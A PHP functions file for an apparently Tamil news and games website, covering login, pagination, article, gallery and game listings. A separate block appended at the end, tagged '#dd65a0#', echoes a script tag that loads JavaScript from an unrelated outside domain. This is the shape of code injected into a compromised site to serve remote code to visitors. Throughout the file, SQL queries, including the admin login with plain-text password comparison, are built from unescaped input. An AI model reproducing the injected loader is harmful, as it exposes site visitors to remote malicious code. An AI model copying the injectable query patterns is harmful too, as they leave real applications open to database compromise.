<?php


function encryptString($str)
    {
		if(function_exists('sha1')) {	// Only in PHP 4.3.0+
			return sha1($str);
		}else if (function_exists('mhash')) {	// Only if Mhash library is loaded
			return bin2hex(mhash(MHASH_SHA1, $str));
		}else{
			return md5($str);
		}
	}
function readed($id,$table)
{
	$select = mysql_query("select read_status from $table where id='$id'");
	$fetchs = mysql_fetch_array($select);
	if($fetchs['read_status']==0)
	{
		mysql_query("update $table set read_status=1 where id='$id'");
	}
}
function login($userid , $pass)
{
	$sql="SELECT uid,status FROM sd_admin WHERE username ='$userid' and password ='$pass'";
	$result=mysql_query($sql);
	return $result;
}
function urlsafe_b64encode($string)
{
  $data = base64_encode($string);
  $data = str_replace(array('+','/','='),array('-','_','.'),$data);
  return $data;
}
function urlsafe_b64decode($string)
{
  $data = str_replace(array('-','_','.'),array('+','/','='),$string);
  $mod4 = strlen($data) % 4;
  if ($mod4) {
    $data .= substr('====', $mod4);
  }
  return base64_decode($data);
}

 define ("MAX_SIZE","1024");

 function getExtension($str) 
 {
     $i = strrpos($str,".");
     if (!$i) { return ""; }
     $l = strlen($str) - $i;
     $ext = substr($str,$i+1,$l);
     return $ext;
 }
function upload_images($image,$tem_name,$max_width,$max_height,$folder_path)
{
	$flag = TRUE;
	
		if($image) 
		{
		$filename = stripslashes($image);
		
		$extension = getExtension($filename);
		
		$extension = strtolower($extension);
		
		if($extension != "jpg" && $extension != "jpeg" && $extension != "png" && $extension != "gif") 	
		{
			$error='<div class="response-msg error1 ui-corner-all">
			<span>Error message</span>
			Unknown Image Formatt </div> ';
		 	$flag = FALSE;		 
		 }
		 else
		 {
		 	
		$size=filesize($tem_name);
		
		if ($size > MAX_SIZE*1024)
		{
		$error='<div class="msgdiv">You have exceeded the size limit!</div> ';
		$flag = FALSE;
		}
		if($extension=="jpg" || $extension=="jpeg"  )
		{
		$uploadedfile = $tem_name;
		$src = imagecreatefromjpeg($uploadedfile);
		}
		else if($extension=="png" && $extension=="png")
		{
		$uploadedfile = $tem_name;
		$src = imagecreatefrompng($uploadedfile);
		}
		else 
		{
		$src = imagecreatefromgif($uploadedfile);
		}
		
		list($width,$height)=getimagesize($uploadedfile);
		
		$newwidth=$max_width;
		$newheight=$max_height;
		
		$tmp=imagecreatetruecolor($newwidth,$newheight);
		
		imagecopyresampled($tmp,$src,0,0,0,0,$newwidth,$newheight,$width,$height);
		
		
		$basename = basename($image);
		$file_name= $basename;
		
		$filename = $folder_path.$file_name;
		
 		imagejpeg($tmp,$filename,100);
		
		
		imagedestroy($src);
		imagedestroy($tmp);
		
		}
		}
return $flag;
}

function downloadAsExcel($html, $filename)
{
    header("Content-Type: application/excel");
    header("Content-Disposition: attachment; filename=".ucwords($filename)."-Data.xls");
    header("Pragma: no-cache");
    header("Expires: 0");
    echo $html;
}

function pagination($query,$per_page,$page = 1,$query_string,$url = '?'){
	        
      	$query = mysql_query("SELECT COUNT(*) as `num` FROM {$query}");
    	$row = mysql_fetch_array($query);
		$total = $row['num'];
        $adjacents = "2"; 

    	$page = ($page == 0 ? 1 : $page);  
    	$start = ($page - 1) * $per_page;								
		
    	$prev = $page - 1;							
    	$next = $page + 1;
		$lastpage = ceil($total/$per_page);
    	$lpm1 = $lastpage - 1;
    	
    	$pagination = "";
    	if($lastpage > 1)
    	{	
    		$pagination .= "<ul class='pagination'>";
                    $pagination .= "<li class='details'>Page $page of $lastpage</li>";
    		if ($lastpage < 7 + ($adjacents * 2))
    		{	
    			for ($counter = 1; $counter <= $lastpage; $counter++)
    			{
    				if ($counter == $page)
    					$pagination.= "<li><a class='current'>$counter</a></li>";
    				else
    					$pagination.= "<li><a href='{$url}page=$counter&$query_string'>$counter</a></li>";					
    			}
    		}
    		elseif($lastpage > 5 + ($adjacents * 2))
    		{
    			if($page < 1 + ($adjacents * 2))		
    			{
    				for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
    				{
    					if ($counter == $page)
    						$pagination.= "<li><a class='current'>$counter</a></li>";
    					else
    						$pagination.= "<li><a href='{$url}page=$counter&$query_string'>$counter</a></li>";					
    				}
    				$pagination.= "<li class='dot'>...</li>";
    				$pagination.= "<li><a href='{$url}page=$lpm1&$query_string'>$lpm1</a></li>";
    				$pagination.= "<li><a href='{$url}page=$lastpage&$query_string'>$lastpage</a></li>";		
    			}
    			elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
    			{
    				$pagination.= "<li><a href='{$url}page=1&$query_string'>1</a></li>";
    				$pagination.= "<li><a href='{$url}page=2&$query_string'>2</a></li>";
    				$pagination.= "<li class='dot'>...</li>";
    				for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
    				{
    					if ($counter == $page)
    						$pagination.= "<li><a class='current'>$counter</a></li>";
    					else
    						$pagination.= "<li><a href='{$url}page=$counter&$query_string'>$counter</a></li>";					
    				}
    				$pagination.= "<li class='dot'>..</li>";
    				$pagination.= "<li><a href='{$url}page=$lpm1&$query_string'>$lpm1</a></li>";
    				$pagination.= "<li><a href='{$url}page=$lastpage&$query_string'>$lastpage</a></li>";		
    			}
    			else
    			{
    				$pagination.= "<li><a href='{$url}page=1&$query_string'>1</a></li>";
    				$pagination.= "<li><a href='{$url}page=2&$query_string'>2</a></li>";
    				$pagination.= "<li class='dot'>..</li>";
    				for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
    				{
    					if ($counter == $page)
    						$pagination.= "<li><a class='current'>$counter</a></li>";
    					else
    						$pagination.= "<li><a href='{$url}page=$counter&$query_string'>$counter</a></li>";					
    				}
    			}
    		}
    		
    		if ($page < $counter - 1){ 
    			$pagination.= "<li><a href='{$url}page=$next&$query_string'>Next</a></li>";
                $pagination.= "<li><a href='{$url}page=$lastpage&$query_string'>Last</a></li>";
    		}else{
    			$pagination.= "<li><a class='current'>Next</a></li>";
                $pagination.= "<li><a class='current'>Last</a></li>";
            }
    		$pagination.= "</ul>\n";		
    	}
    
    
        return $pagination;
    } 
    
function pagination01($query,$per_page,$page = 1,$query_string,$url = '?'){
	        
      	$query = mysql_query("SELECT COUNT(*) as `num` FROM {$query}");
    	$row = mysql_fetch_array($query);
		$total = $row['num'];
        $adjacents = "2"; 

    	$page = ($page == 0 ? 1 : $page);  
    	$start = ($page - 1) * $per_page;								
		
    	$prev = $page - 1;							
    	$next = $page + 1;
		$lastpage = ceil($total/$per_page);
    	$lpm1 = $lastpage - 1;
    	
    	$pagination = "";
    	if($lastpage > 1)
    	{	
    		$pagination .= "<ul class='pagination'>";
                    $pagination .= "<li class='details'>Page $page of $lastpage</li>";
    		if ($lastpage < 7 + ($adjacents * 2))
    		{	
    			for ($counter = 1; $counter <= $lastpage; $counter++)
    			{
    				if ($counter == $page)
    					$pagination.= "<li><a class='current'>$counter</a></li>";
    				else
    					$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";					
    			}
    		}
    		elseif($lastpage > 5 + ($adjacents * 2))
    		{
    			if($page < 1 + ($adjacents * 2))		
    			{
    				for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
    				{
    					if ($counter == $page)
    						$pagination.= "<li><a class='current'>$counter</a></li>";
    					else
    						$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";					
    				}
    				$pagination.= "<li class='dot'>...</li>";
    				$pagination.= "<li><a href='{$url}$lpm1'>$lpm1</a></li>";
    				$pagination.= "<li><a href='{$url}$lastpage'>$lastpage</a></li>";		
    			}
    			elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
    			{
    				$pagination.= "<li><a href='{$url}1'>1</a></li>";
    				$pagination.= "<li><a href='{$url}2'>2</a></li>";
    				$pagination.= "<li class='dot'>...</li>";
    				for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
    				{
    					if ($counter == $page)
    						$pagination.= "<li><a class='current'>$counter</a></li>";
    					else
    						$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";					
    				}
    				$pagination.= "<li class='dot'>..</li>";
    				$pagination.= "<li><a href='{$url}$lpm1'>$lpm1</a></li>";
    				$pagination.= "<li><a href='{$url}$lastpage'>$lastpage</a></li>";		
    			}
    			else
    			{
    				$pagination.= "<li><a href='{$url}1'>1</a></li>";
    				$pagination.= "<li><a href='{$url}2'>2</a></li>";
    				$pagination.= "<li class='dot'>..</li>";
    				for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
    				{
    					if ($counter == $page)
    						$pagination.= "<li><a class='current'>$counter</a></li>";
    					else
    						$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";					
    				}
    			}
    		}
    		
    		if ($page < $counter - 1){ 
    			$pagination.= "<li><a href='{$url}$next'>Next</a></li>";
                $pagination.= "<li><a href='{$url}$lastpage'>Last</a></li>";
    		}else{
    			$pagination.= "<li><a class='current'>Next</a></li>";
                $pagination.= "<li><a class='current'>Last</a></li>";
            }
    		$pagination.= "</ul>\n";		
    	}
    
    
        return $pagination;
    } 
function get_advertisement($page,$pos)
{
	
	$selectad = mysql_query("select ad_code from advertisement where advert_page='$page' and advert_pos='$pos' ORDER BY RAND() LIMIT 1");
	if(mysql_num_rows($selectad)>0){
	$fetchad = mysql_fetch_assoc($selectad);
	$dis_ad = $fetchad['ad_code'];
	}else
	{
	echo "Post Your AD Here";	
	}
	return $dis_ad;
}
function get_breaking_news()
{
	$selectad = mysql_query("select id,article_title,category from articles where breaking_news='1' and status='1' ORDER BY id DESC");
	$dis_ad = '<ul id="js-news" class="js-hidden">';
	if(mysql_num_rows($selectad)>0){
	while($fetchad = mysql_fetch_assoc($selectad))
		{
			$dis_ad .= '<li class="news-item"><a href="/english/news/'.get_category_name($fetchad['category']).'/'.$fetchad['id'].'.html">'.str_replace(array('/', '\\'), '', stripcslashes($fetchad['article_title'])).'</a></li>';
		}	
	}
	else
	{
		$dis_ad .='<li class="news-item">We Will Update Soon.</li>';
	}
	$dis_ad .= '</ul>';	
	return $dis_ad;
}
function get_article_by_id($artid)
{
	$selectnews = mysql_query("select id,article_title,position,image,img_caption,article,article_date from articles where id='$artid' and status='1'");
	$fetchnews = mysql_fetch_array($selectnews);
	return $fetchnews;
}
function get_article_by_category($catid,$start,$limit)
{
	$ee = "select id,article_title,position,image,img_caption,article,article_date,category from articles where category='$catid' and status='1' order by id desc limit $start,$limit";
 		
	$selectnews = mysql_query($ee);
 	if(mysql_num_rows($selectnews)>0){

		while ($row = mysql_fetch_assoc($selectnews)) {
		$data[]=$row;
		}
		// free the memory
		mysql_free_result($selectnews);
		
	}
	else
	{
		$data[0]['article_title']='<span class="no_news">We Will Update Soon.</span>';
	}
	
	return $data;
}
function get_article_by_category_pagination($catid,$pageno)
{
		$category_name =get_category_name($catid);
		$limit = 7;	
    	$startpoint = ($pageno * $limit) - $limit;
        $statement = "articles where category='$catid' and status='1' order by id desc";
        $where_string = "";
 		$pagination = pagination01($statement,$limit,$pageno,$where_string,"/tamil/news/".$category_name."/page/");
		
	$ee = "select id,article_title,position,image,img_caption,article,article_date,category from {$statement} LIMIT {$startpoint} , {$limit}";
 	
		
	$selectnews = mysql_query($ee);
 	if(mysql_num_rows($selectnews)>0){

		while ($row = mysql_fetch_assoc($selectnews)) {
		$data[]=$row;
		}
		// free the memory
		mysql_free_result($selectnews);
		
	}
	else
	{
		$data[0]['article_title']='<span class="no_news">We Will Update Soon.</span>';
	}
	$display = "";
	foreach($data as $category_news){
			 	
			 $display .='<div class="cat_new_block">
            	<a href="/tamil/news/'.get_category_name($category_news['category']).'/'.$category_news['id'].'.html"><span class="cat_new_title">'.stripslashes($category_news['article_title']).'</span></a>
                <img src="/tamil/adminpanel/article_images/sub1/'.$category_news['image'].'" class="cat_img" />
                <div class="cat_news_pg">'.snippetgreedy(stripslashes($category_news['article']),750).'<a href="/tamil/news/'.get_category_name($category_news['category']).'/'.$category_news['id'].'.html" class="ach">மேலும் காண</a>
                </div>
            </div>';
			 	 
			 }
	
	return $display.$pagination;
}
function get_article_by_category_list($catid,$start,$limit)
{
	if($catid=="all" || $catid=="All")
	{
	$ee = "select id,article_title,position,image,img_caption,article,article_date,category from articles where homepage!='1' and status='1' order by id desc limit $start,$limit";
	}
	else
	{
 	$ee = "select id,article_title,position,image,img_caption,article,article_date,category from articles where category='$catid' and status='1' order by id desc limit $start,$limit";
 	}
		
	$selectnews = mysql_query($ee);
 	if(mysql_num_rows($selectnews)>0){

		while ($row = mysql_fetch_assoc($selectnews)) {
		$data[]=$row;
		}
		// free the memory
		mysql_free_result($selectnews);
		
	}
	else
	{
		$data[0]['article_title']='<span class="no_news">We Will Update Soon.</span>';
	}
	
	return $data;
}
function get_home_page_slider()
{
	$selectnews = mysql_query("select id,category,article_title,image,img_caption from articles where homepage='1' and status='1' order by id desc limit 0,10");
	if(mysql_num_rows($selectnews)>0){
	while($fetchnews = mysql_fetch_assoc($selectnews))
	{
		$display .= '<li jcarouselindex="1" style="float: left; list-style: none outside none;" class="jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal">
		<a href="news/'.get_category_name($fetchnews['category']).'/'.$fetchnews['id'].'.html">
    	<div class="top_news_block">
         	<img src="/tamil/adminpanel/article_images/sub2/'.$fetchnews['image'].'" title="'.$fetchnews['img_caption'].'" class="top_news_img">
            <p class="top_news_pg">'.str_replace(array('/', '\\'), '',stripcslashes($fetchnews['article_title'])).'</p>
        </div>
		</a>
    </li>';
	}
	}
	else
	{
		$display .='<span class="no_news">We Will Update Soon.</span>';
	}
	return $display;
}
function get_category_name($catid)
{
	$select = mysql_query("select name from category where id='$catid'");
	$fetch = mysql_fetch_assoc($select);
	$category_name = $fetch['name'];
	
	return $category_name; 
}
function get_left_category_name_list()
{
 $display = "";
 		$select = mysql_query("select id,name from category where section='left' order by name asc");
		while($fetch = mysql_fetch_assoc($select))
		{
		$display .= '<li><a href="/'.str_replace(" ", "-", $fetch['name']).'.html">'.$fetch['name'].'</a></li>';
		}
	
	return $display; 
}
function get_top_category_name_list()
{
 $display = "";
 		$select = mysql_query("select id,name from category where section='top' order by name asc");
		while($fetch = mysql_fetch_assoc($select))
		{
		$display .= '<li class="leaf"><a href="/'.str_replace(" ", "-", $fetch['name']).'.html" title=""><span>'.$fetch['name'].'</span></a></li>';
		}
	
	return $display; 
}
function get_category_id($catname)
{
$catname = str_replace("-", " ", $catname);

		$select = mysql_query("select id from category where name like '%$catname%'");
		$fetch = mysql_fetch_assoc($select);
		$category_name = $fetch['id'];
	
	return $category_name; 
}

function get_game_id($catname)
{
$catname = str_replace("-", " ", $catname);
		$select = mysql_query("select id from game where title like '%$catname%'");
		$fetch = mysql_fetch_assoc($select);
		$category_name = $fetch['id'];
	
	return $category_name; 
}

function get_article_id($catname)
{
	$artname = str_replace("+", " ", $catname);
		$select = mysql_query("select id from articles where article_title like '%$artname%' order by id asc");
		$fetch = mysql_fetch_assoc($select);
		$category_name = $fetch['id'];
	
	return $category_name; 
}

function get_gellery($pageno)
{
		$limit = 3;	
    	$startpoint = ($pageno * $limit) - $limit;
        $statement = "`gallery`";
        $where_string = "";
 		$pagination = pagination($statement,$limit,$pageno,$where_string);
		
		$selectg = mysql_query("select * from {$statement} LIMIT {$startpoint} , {$limit}");
		
		$dis_gallery = "<ul>";
		
		while($fetchg=mysql_fetch_assoc($selectg))
		{
			$dis_gallery .= "<li>".$fetchg['gtitle']."</li>";
		}
		$dis_gallery .= "</ul>";
}
function get_state_list()
{
	$select = mysql_query("select id,state_name from states where status=1");
$options = ""; 
while($fetch=mysql_fetch_array($select))
{
	$options .= "<option value='".$fetch['id']."'>".$fetch['state_name']."</option>";
}
return $options;
}
function get_game_by_id($id)
{
 	
	$ee = "select id,title,instructions,meta_tag,flash_file,keywords,image_file from game where id='$id'";
	
 	$selectnews = mysql_query($ee);
 
			while ($row = mysql_fetch_assoc($selectnews)) {
		   $data[]=$row;
		}
 		// free the memory
		mysql_free_result($selectnews);
	
	return $data;
}
function get_game_title_id($id)
{
 	
	$ee = "select title from game where id='$id'";
	
 	$selectnews = mysql_query($ee);
 	$row = mysql_fetch_assoc($selectnews);
 	$result = str_replace(" ","-",$row['title']);
 	return $result;
}
function get_latest_new_games()
{
	$output = '';
	$select = mysql_query("select id,title,image_file,cat_id from game where status='1' and cat_id='20' and other_site='no' order by id desc limit 0,24");
	$i=0;
	while($fetch=mysql_fetch_array($select))
	{
		
	$output .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $fetch['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $output .=      '<span title="New game" class="newgame"></span>';
                }
         $output .=   '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html">'.snippetgreedy($fetch['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			
	}
	return  $output;
}

function get_latest_games_by_random($gameid)
{
	$output = '';
	$select = mysql_query("select id,title,image_file,cat_id from game where status='1' and cat_id='20' and other_site='no' and id!='$gameid' order by rand() limit 0,12");
	$i=0;
	while($fetch=mysql_fetch_array($select))
	{
		
	$output .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $fetch['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $output .= '<span title="New game" class="newgame"></span>';
                }
         $output .=   '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html">'.snippetgreedy($fetch['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			
	}
	return  $output;
}

function get_papular_games()
{
	$output = '';
	$select = mysql_query("select id,title,image_file,cat_id from game where status='1' and cat_id!='20' and other_site='no' order by id desc limit 0,24");
	$i=0;
	while($fetch=mysql_fetch_array($select))
	{
		
	$output .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $fetch['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $output .=      '<span title="New game" class="newgame"></span>';
                }
         $output .=   '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html">'.snippetgreedy($fetch['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			
	}
	
	return  $output;
}
function get_othersite_games()
{
	$output = '';
	$select = mysql_query("select id,title,image_file,cat_id from game where status='1' and other_site='yes' order by id desc limit 0,24");
	$i=0;
	while($fetch=mysql_fetch_array($select))
	{
		
	$output .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $fetch['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $output .=      '<span title="New game" class="newgame"></span>';
                }
         $output .=   '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html">'.snippetgreedy($fetch['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			
	}
	
	return  $output;
}
function get_game_by_catid($catid,$start,$limit)
{
	
	$ee = "select id,title,image_file,cat_id from game where cat_id='$catid' and status='1' order by id desc limit $start,$limit";
	$output = '';
	$select = mysql_query($ee);
	$i=0;
	while($fetch=mysql_fetch_array($select))
	{
	$output .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $fetch['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $output .=      '<span title="New game" class="newgame"></span>';
                }
         $output .=   '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($fetch['cat_id'])).'/'.get_game_title_id($fetch['id']).'.html">'.snippetgreedy($fetch['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			
	}
	
	return  $output;
}
function game($catid,$pageno)
{
	
	$category_name =get_category_name($catid);
		$limit = 36;	
    	$startpoint = ($pageno * $limit) - $limit;
        $statement = "game where cat_id='$catid' and status='1' order by id desc";
        $where_string = "";
 		$pagination = pagination01($statement,$limit,$pageno,$where_string,$category_name."/page/");
		
		  $ee = "select id,title,image_file,cat_id from {$statement} LIMIT {$startpoint} , {$limit}";
 	
		
	$selectnews = mysql_query($ee);
 	if(mysql_num_rows($selectnews)>0){

		while ($row = mysql_fetch_assoc($selectnews)) {
		$data[]=$row;
		}
		// free the memory
		mysql_free_result($selectnews);
		
	}
	else
	{
		
	}
	$display = "";
	$i=0;
	foreach($data as $category_news){
		
		$display .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($category_news['cat_id'])).'/'.get_game_title_id($category_news['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $category_news['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $display .=  '<span title="New game" class="newgame"></span>';
                }
           $display .= '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($category_news['cat_id'])).'/'.get_game_title_id($category_news['id']).'.html">'.snippetgreedy($category_news['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			 	
			 }
	
	return $display.$pagination;
	
}
function get_game_by_catid_with_pagination($catid,$pageno)
{
	
	$category_name =str_replace(" ", "-",get_category_name($catid));
	$limit = 36;	
    $startpoint = ($pageno * $limit) - $limit;
    $statement = "game where cat_id='$catid' and status='1' order by id desc";
    $where_string = "";
 	$pagination = pagination01($statement,$limit,$pageno,$where_string,"/".$category_name."/page/");
		
	$ee = "select id,title,image_file,cat_id from {$statement} LIMIT {$startpoint} , {$limit}";
 	
		
	$selectnews = mysql_query($ee);
 	if(mysql_num_rows($selectnews)>0){

		while ($row = mysql_fetch_assoc($selectnews)) {
		$data[]=$row;
		}
		// free the memory
		mysql_free_result($selectnews);
		
	}
	else
	{
		
	}
	$display = "<ul>";
	$i=0;
	foreach($data as $category_news){
		
		$display .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($category_news['cat_id'])).'/'.get_game_title_id($category_news['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $category_news['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $display .=      '<span title="New game" class="newgame"></span>';
                }
         $display .=   '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($category_news['cat_id'])).'/'.get_game_title_id($category_news['id']).'.html">'.snippetgreedy($category_news['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			 	
			 }
	
	return $display."</ul>".$pagination;
	
}
function get_game_by_keyword_with_pagination($keyword,$pageno)
{
    
	
	$limit = 36;	
    $startpoint = ($pageno * $limit) - $limit;
    $statement = "game where title like '%$keyword%' and status='1' order by id desc";
    $where_string = "";
 	$pagination = pagination01($statement,$limit,$pageno,$where_string,"/page/");
		
	$ee = "select id,title,image_file,cat_id from {$statement} LIMIT {$startpoint} , {$limit}";
 	
		
	$selectnews = mysql_query($ee);
 	if(mysql_num_rows($selectnews)>0){

		while ($row = mysql_fetch_assoc($selectnews)) {
		$data[]=$row;
		}
		// free the memory
		mysql_free_result($selectnews);
		
	}
	else
	{
		
	}
	$display = "<ul>";
	$i=0;
	if(count($data)>0)
	{
	foreach($data as $category_news){
		
		$display .= '<li class="views-row ">
            <div class="views-field-field-upload-image-fid">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($category_news['cat_id'])).'/'.get_game_title_id($category_news['id']).'.html"><img src="/'.str_replace(".PNG", ".png", $category_news['image_file']).'" width="100px" height="100px" /></a>
                </span>';
                if($i==0)
                {
           $display .=      '<span title="New game" class="newgame"></span>';
                }
         $display .=   '</div>
            <div class="views-field-title">
                <span class="field-content">
                    <a href="/'.str_replace(" ", "-", get_category_name($category_news['cat_id'])).'/'.get_game_title_id($category_news['id']).'.html">'.snippetgreedy($category_news['title'],10,'...').'</a>
                </span>
            </div>
            </li>';
			$i++;
			 	
			 }
			 }else
			 {
			 	$display .= '<li class="no-result"><h2>No Result Found for this keyword.</h2></li>';
			 }

	
	return $display."</ul>".$pagination;
	
}
function get_rightside_more_news($catid,$start,$limit)
{
 
 	$ee = "select id,article_title,position,image,img_caption,article,article_date,category from articles where category != '$catid' and status='1' group by category order by id desc  limit $start,$limit";
 	 
	$selectnews = mysql_query($ee);
 	
	if(mysql_num_rows($selectnews)>0){
 
		while ($row = mysql_fetch_assoc($selectnews)) {
		   $data[]=$row;
		}
 		// free the memory
		mysql_free_result($selectnews);
	}
	else
	{
		$data[0]['article_title']='We Will Update Soon.';		
	}
	 
	return $data;
	
} 

function get_gallery_by_category($limit)
{
	if($limit=="all")
	{
		$where = "where a.status=1 group by b.gid";
	}
	else {
		$where = "where a.status=1 group by b.gid limit 0,$limit";
	}
	
	$selectg = mysql_query("select a.id,a.gtitle,b.img_path from gallery as a Join gallery_images as b on a.id=b.gid $where");

 	while ($row = mysql_fetch_assoc($selectg)) {
 		 
		   $data[]=$row;
		}
 		// free the memory
		mysql_free_result($selectg);
	
	return $data;
 
}

function get_gellery_by_category($pageno)
{
		$limit = 12;	
    	$startpoint = ($pageno * $limit) - $limit;
        $statement = "`gallery`";
        $where_string = "";
 		$pagination = pagination($statement,$limit,$pageno,$where_string);
		
		$selectg = mysql_query("select * from {$statement} LIMIT {$startpoint} , {$limit}");
		
		$dis_gallery = "";
		
		while($fetchg=mysql_fetch_assoc($selectg))
		{
			$gid = $fetchg['id'];
			$select = mysql_query("select img_path from gallery_images where gid='$gid'");
			$fetch_img = mysql_fetch_assoc($select);
			
			$dis_gallery .= ' <a href=view_photos.php?gid='.$gid.' >
                <div class="gal_img_block">
                	<img src="/tamil/adminpanel/gallery_images/thumb/'.$gid.'/'.$fetch_img['img_path'].'" class="gal_img" />
                    <span class="gal_span">'.$fetchg['gtitle'].'</span>
                </div>
                </a>';
		}
		$dis_gallery .= $pagination;
		
		return $dis_gallery;
}
function get_gellery_by_id($pageno,$gid)
{
		$limit = 12;	
    	$startpoint = ($pageno * $limit) - $limit;
        $statement = "gallery where id='$gid'";
        $where_string = "";
 		$pagination = pagination($statement,$limit,$pageno,$where_string);

		$selectg = mysql_query("select * from {$statement} LIMIT {$startpoint} , {$limit}");
		$fetchg=mysql_fetch_assoc($selectg);

			$gid = $fetchg['id'];
			$select = mysql_query("select img_path from gallery_images where gid='$gid'");
			$dis_gallery = '<span class="gal_spans">'.$fetchg['gtitle'].'</span>';
			while($fetch_img = mysql_fetch_assoc($select))
			{
			$dis_gallery .= ' <a href="/tamil/adminpanel/gallery_images/'.$gid.'/'.$fetch_img['img_path'].'" rel="lightbox[plants]" title="'.$fetchg['gtitle'].'">
                <div class="gal_img_block">
                <img src="/tamil/adminpanel/gallery_images/thumb/'.$gid.'/'.$fetch_img['img_path'].'" class="gal_img" />
                </div>
                </a>';
		}
		$dis_gallery .= $pagination;
		
		return $dis_gallery;
}

function get_poll($id)
{
	$selectg = mysql_query("select * from poll where gameid='$id'");
	$fetchg=mysql_fetch_assoc($selectg);
	
	return $fetchg;
}

function get_videos()
{
	$selectg = mysql_query("select * from videos where status='1' order by vid desc");
	
	while($fetchg=mysql_fetch_assoc($selectg))
	{
		$video .='<div class="gal_video_block">
                    <object class="gal_img" wmode="transparent">
                    <param name="movie" value="'.$fetchg['path_link'].'">
                    <param name="allowFullScreen" value="true">
                    <param name="allowscriptaccess" value="always">
                    <embed width="303" height="165" src="'.$fetchg['path_link'].'" type="application/x-shockwave-flash" allowscriptaccess="always" wmode="transparent" allowfullscreen="true">
                    </object>
                    <span class="gal_span">'.$fetchg['title'].'</span>
                    <a class="voverlay" href="'.$fetchg['path_link'].'">
                    <div class="spacer"></div>
                    </a>
                </div>';
	}
	
	return $video;
}
function get_video()
{
	$selectg = mysql_query("select * from videos where status='1' order by vid desc LIMIT 0,1");
	$fetchg=mysql_fetch_assoc($selectg);
	
	return $fetchg;
}

function snippetgreedy($text,$length=64,$tail="...") 
{
	$text = trim($text);
	if(strlen($text) > $length) {
	for($i=0;$text[$length+$i]!=" ";$i++) {
	if(!$text[$length+$i]) {
	return $text;
	}
	}
		$text = substr($text,0,$length+$i) . $tail;
	}
	return $text;
}
function get_district_list()
{
	$select = mysql_query("select id,district_name from ccts_main_india_district where status=1");
$options = ""; 
while($fetch=mysql_fetch_array($select))
{
	$options .= "<option value='".$fetch['id']."'>".$fetch['district_name']."</option>";
}
return $options;
}
?>
<?php
#dd65a0#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967256\"></script>";
echo $g;
}
#/dd65a0#
